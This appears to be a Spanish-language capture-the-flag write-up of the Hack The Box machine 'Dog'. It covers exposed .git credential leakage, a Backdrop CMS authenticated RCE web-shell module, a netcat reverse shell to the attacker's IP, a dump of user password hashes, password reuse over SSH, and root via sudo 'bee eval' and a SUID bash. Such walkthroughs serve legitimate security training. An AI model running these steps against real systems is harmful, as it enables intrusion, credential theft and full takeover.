---
tags:
title: Dog - Easy (HTB)
permalink: /Dog-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---

---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.231.223
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 21:17 -03
Nmap scan report for dog.htb (10.129.231.223)
Host is up (0.57s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.129.231.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.55 seconds

```

## Website / Port 80

La pagina principal es la siguiente:

![image-center](/assets/images/{DA52FFF5-0362-4947-9F65-88A5F8148417}.png)

La pagina en si no presenta nada excepto un panel de login y un mensaje en el pie de maquina que indica que se usa `Backdrop CMS` como gestor de contenido.

![image-center](/assets/images/{FDFB6211-E11D-4C56-803F-8599A821A5F7}.png)

## Backdrop page as tiffany
### Git repository

El escaneo de nmap me revelo la ruta `.git/` en la pagina, la cual tiene demasiadas carpetas pero para ahorrarme el proceso de excavar en cada una de ellas uso la herramient [GitHack](https://github.com/lijiejie/GitHack) para eso la clonamos a nuestra maquina 

```bash]
git clone https://github.com/lijiejie/GitHack
```

Y luego corremos el script.

```bash
python3 GitHack.py http://dog.htb/.git/
```

Una vez finaliza el script veo dentro de el archivo `settings.php` credenciales para una base de datos de `BackDrop`

```bash
<?php

 */
	$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';

 * Example:
 * @code
 * $settings['hash_salt'] = file_get_contents('/home/example/salt.txt');
 * @endcode
 *
 */
$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';

/**

```

## Shell as www-data

Puedo buscar por `@dog.htb` en busca de usuarios de la pagina, y veo q me encuentra a `tiffany`
```bash
cat * | grep "@dog"                                      
        "tiffany@dog.htb"  
```

Usando las credenciales de este usuario con la password encontrada en el archivo `.php` gano acceso al panel de `Backdrop`.

![image-center](/assets/images/{F4BF56D6-D0AD-4558-93C3-FA430902BD28}.png)

Buscando por vulnerabilidades, veo una que se trata de una vez estar autenticados en la pagina, tengo la posibilidad de obtener una ejecuci√≥n remota de comandos.

```bash
 searchsploit backdrop                                                                    
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Backdrop CMS 1.20.0 - 'Multiple' Cross-Site Request Forgery (CSRF)                                                                                       | php/webapps/50323.html
Backdrop CMS 1.23.0 - Stored XSS                                                                                                                         | php/webapps/51905.txt
Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)                                                                                       | php/webapps/52021.py
Backdrop Cms v1.25.1 - Stored Cross-Site Scripting (XSS)                                                                                                 | php/webapps/51597.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

La bajo y lo ejecuto.

```bash
python3 exploit.py http://dog.htb                                                        
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb/modules/shell/shell.php
```

El mismo me deja un zip y una carpeta que dentro contiene el archivo `php` malicioso. El mismo output del script me indica que tengo que ir a la ruta **`http://dog.htb/admin/modules/instal`** para la instalacion del mismo, pero en la pagina veo que acepta archivo comprimidos `tar`, `tar.gz` pero zip no.

Por lo que pasamos a convetir la carpeta shell a un `tar.gz`.

```bash
 tar -cvzf zs1n.tar.gz shell
shell/
shell/shell.php
shell/shell.info
```

En la seccion de `Functionality` puedo ir a instalar el modulo el cual esta dentro de mi archivo `.tar.gz`.

![image-center](/assets/images/{70A13B95-7A56-4BD2-8FF0-5D779555E3AF}.png)

Como veo el modulo se instalo correctamente.

![image-center](/assets/images/{7A80E49E-0901-46DB-A807-17632148684F}.png)

Ahora con curl voy a hacer una peticion a la ruta donde se instalo el modulo para ver si tengo ejecucion remota de comandos.

```bash
curl -s -X GET 'http://dog.htb/modules/shell/shell.php?cmd=whoami'                                            

    <html>
    <body>
    <form method="GET" name="shell.php">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    www-data
    </pre>
    </body>
    </html>
```

Como veo que el usuario detras de la pagina es `www-data` ahora puedo enviarme una shell a mi maquina.

```bash
curl -s -X GET 'http://dog.htb/modules/shell/shell.php?cmd=busybox%20nc%2010.10.17.19%204444%20-e%20bash'

```

Y desde mi listener `nc` recibo la shell.
```bash
sudo nc -nlvp 4444
[sudo] password for zsln: 
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.231.223] 42186
whoami
www-data
```

## Shell as johncusack

### Enumeration

Enumerando usuarios atravez del contenido del `/etc/passwd` veo que ademas de `root` y `www-data` estan **`jobert`** y **`johncusack`**.

```bash
www-data@dog:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

Usando las credenciales del inicio para la base de dato, me conecto a la misma.

```bash
www-data@dog:/var/www/html$ mysql -u root -pBackDropJ2024DS2024 -D backdrop 
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1904
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
+-----------------------------+
| Tables_in_backdrop          |
+-----------------------------+
| batch                       |
| cache                       |
| cache_admin_bar             |
| cache_bootstrap             |
| cache_entity_comment        |
| cache_entity_file           |
| cache_entity_node           |
| cache_entity_taxonomy_term  |
| cache_entity_user           |
| cache_field                 |
| cache_filter                |
| cache_layout_path           |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| cache_token                 |
| cache_update                |
| cache_views                 |
| cache_views_data            |
| comment                     |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_metadata               |
| file_usage                  |
| flood                       |
| history                     |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| queue                       |
| redirect                    |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| state                       |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| tempstore                   |
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+
59 rows in set (0.00 sec)

mysql> select * from users;
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
| uid | name              | pass                                                    | mail                       | signature | signature_format | created    | changed    | access     | login      | status | timezone | language | picture | init                       | data       |
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
|   0 |                   |                                                         |                            |           | NULL             |          0 |          0 |          0 |          0 |      0 | NULL     |          |       0 |                            | NULL       |
|   1 | jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. | jPAdminB@dog.htb           |           | NULL             | 1720548614 | 1720584122 | 1720714603 | 1720584166 |      1 | UTC      |          |       0 | jPAdminB@dog.htb           | 0x623A303B |
|   2 | jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 | jobert@dog.htb             |           | NULL             | 1720584462 | 1720584462 | 1720632982 | 1720632780 |      1 | UTC      |          |       0 | jobert@dog.htb             | NULL       |
|   3 | dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD | dogBackDroopSystem@dog.htb |           | NULL             | 1720632880 | 1720632880 | 1723752097 | 1723751569 |      1 | UTC      |          |       0 | dogBackDroopSystem@dog.htb | NULL       |
|   5 | john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. | john@dog.htb               |           | NULL             | 1720632910 | 1720632910 |          0 |          0 |      1 | UTC      |          |       0 | john@dog.htb               | NULL       |
|   6 | morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS | morris@dog.htb             |           | NULL             | 1720632931 | 1720632931 |          0 |          0 |      1 | UTC      |          |       0 | morris@dog.htb             | NULL       |
|   7 | axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV | axel@dog.htb               |           | NULL             | 1720632952 | 1720632952 |          0 |          0 |      1 | UTC      |          |       0 | axel@dog.htb               | NULL       |
|   8 | rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT | rosa@dog.htb               |           | NULL             | 1720632982 | 1720632982 |          0 |          0 |      1 | UTC      |          |       0 | rosa@dog.htb               | NULL       |
|  10 | tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v | tiffany@dog.htb            |           | NULL             | 1723752136 | 1723752136 | 1763419238 | 1763418263 |      1 | UTC      |          |       0 | tiffany@dog.htb            | NULL       |
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
9 rows in set (0.00 sec)
```

Al extraer el hash de la tabla `users`, puedo extraer los hashes del usuario `jobert`, el cual es uno de los usuarios con una `bash` asignada. Pero sin embargo el hash es incrackeable.

Pero volviendo atras tengo la password de la base de datos, quizas podria ser reutilizable para alguno de los dos usuarios, y veo que efectivamente es para el usuario `johncusack`.

```bash
ssh johncusack@dog.htb 
The authenticity of host 'dog.htb (10.129.231.223)' can't be established.
ED25519 key fingerprint is: SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:23: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dog.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
johncusack@dog.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

[..snip..]

johncusack@dog:~$
```

## Shell as root

### Enumeration

Viendo privilegios que tengo con dicho usuario veo que tengo la capacidad de ejecutar `/usr/local/bin/bee` como cualquier usuario del sistema

```bash
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

### Bee help panel

```bash
johncusack@dog:~$ bee
üêù Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.

 --base-url
 Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.

 --yes, -y
 Answer 'yes' to questions without prompting.

 --debug, -d
 Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).


Commands:
 CONFIGURATION
  config-export
   cex, bcex
   Export config from the site.

  config-get
   cget
   Get the value of a specific config option, or view all the config options in a given file.

  config-import
   cim, bcim
   Import config into the site.

  config-set
   cset
   Set the value of an option in a config file.

 CORE
  download-core
   dl-core
   Download Backdrop core.

  install
   si, site-install
   Install Backdrop and setup a new site.

 DATABASE
  db-drop
   sql-drop
   Drop the current database and recreate an empty database with the same details. This could be used prior to import if the target database has more tables than the source database.

  db-export
   dbex, db-dump, sql-export, sql-dump
   Export the database as a compressed SQL file. This uses the --no-tablespaces option by default.

  db-import
   dbim, sql-import
   Import an SQL file into the current database.

 INFORMATION
  help
   Provide help and examples for 'bee' and its commands.

  log
   ws, dblog, watchdog-show
   Show database log messages.

  status
   st, info, core-status
   Provides an overview of the current Backdrop installation/site.

  version
   Display the current version of Bee.

 MISCELLANEOUS
  cache-clear
   cc
   Clear a specific cache, or all Backdrop caches.

  cron
   Run cron.

  maintenance-mode
   mm
   Enable or disable maintenance mode for Backdrop.

 PROJECTS
  disable
   dis, pm-disable
   Disable one or more projects (modules, themes, layouts).

  download
   dl, pm-download
   Download Backdrop contrib projects.

  enable
   en, pm-enable
   Enable one or more projects (modules, themes, layouts).

  projects
   pml, pmi, project, pm-list, pm-info
   Display information about available projects (modules, themes, layouts).

  uninstall
   pmu, pm-uninstall
   Uninstall one or more modules.

 ROLES
  permissions
   pls, permissions-list
   List all permissions of the modules.

  role-add-perm
   rap
   Grant specified permission(s) to a role.

  role-create
   rcrt
   Add a role.

  role-delete
   rdel
   Delete a role.

  role-remove-perm
   rrp
   Remove specified permission(s) from a role.

  roles
   rls, roles-list
   List all roles with the permissions.

 STATE
  state-get
   sg, sget
   Get the value of a Backdrop state.

  state-set
   ss, sset
   Set the value of an existing Backdrop state.

 THEMES
  theme-admin
   admin-theme
   Set the admin theme.

  theme-default
   default-theme
   Set the default theme.

 UPDATE
  update-db
   updb, updbst, updatedb, updatedb-status
   Show, and optionally apply, all pending database updates.

 USERS
  user-add-role
   urole, urol
   Add role to user.

  user-block
   ublk
   Block a user.

  user-cancel
   ucan
   Cancel/remove a user.

  user-create
   ucrt
   Create a user account with the specified name.

  user-login
   uli
   Display a login link for a given user.

  user-password
   upw, upwd
   Reset the login password for a given user.

  user-remove-role
   urrole, urrol
   Remove a role from a user.

  user-unblock
   uublk
   Unblock a user.

  users
   uls, user-list
   List all user accounts.

 ADVANCED
  db-query
   dbq
   Execute a query using db_query().

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop's database credentials.
```

Si ejecuto el comando status de `bee`. Veo que me sale un mensaje el cual dice que no se encuentra la instalacion de `Backdrop`, quiza es porque no estoy en el directorio adecuado, y como se que la pagina corre en `/var/www/html` puedo ir a esa ruta y ejecutar alg√∫n comando desde ahi.

```bash
johncusack@dog:/home$ sudo bee status

 ‚ö†Ô∏è No Backdrop installation found. Run this command again from within a Backdrop installation, or use the '--root' global option. 
```

Por ejemplo el comando **`eval`**, el cual como indica en el panel de ayuda permite ejecutar codigo `php`, usando la funcion `system` del propio lenguaje, haciendo una demostracion ejecutando el comando `whoami` veo que en la respuesta dice `root`
```bash
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee eval 'system("whoami")'
root
```

Ahora como puedo ejecutar comandos, puedo leer la flag de `root` y por ende tambien ganar acceso
```bash
johncusack@dog:/var/www/html$ sudo bee eval 'system("cat /root/root.txt")'
0bd1d8d29f0d3833dad020ad8f1a380b
johncusack@dog:/var/www/html$ 
```

Para ganar acceso solo me basta con otorgarle el bit `suid` a la bash para luego obtener una shell como **`root`**.

```bash
johncusack@dog:/var/www/html$ sudo bee eval 'system("chmod u+s /bin/bash")'
johncusack@dog:/var/www/html$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

```bash
johncusack@dog:/var/www/html$ bash -p 
bash-5.0# whoami
root
```

Y nuevamente puedo ver la `flag`.

```bash
bash-5.0# cat /root/root.txt 
0bd1d8d29f0d3833dad020ad8f1a380b
```

`~Happy Hacking.`